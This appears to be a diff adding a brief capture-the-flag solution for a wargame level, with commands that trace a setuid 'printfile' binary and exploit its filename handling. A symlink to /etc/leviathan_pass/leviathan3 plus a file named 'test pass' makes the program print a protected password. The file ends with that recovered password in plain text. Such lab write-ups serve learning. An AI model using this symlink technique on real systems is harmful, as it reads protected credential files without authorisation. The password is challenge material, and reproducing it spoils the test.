@@ -1,0 +1,15 @@
+//create a folder in tmp to have a sandbox to ltrace the binary
+
+mkdir /tmp/sandbox
+cd /tmp/sandbox
+echo "test" > text.txt 
+ltrace ~/printfile text.txt
+
+// exploit the bad handling of string (access take the full 
+// string while the cat will take each word as a different one)
+
+ln -s /etc/leviathan_pass/leviathan3 pass
+touch "test pass"
+~/printfile "test pass"
+
+Ahdiemoo1j
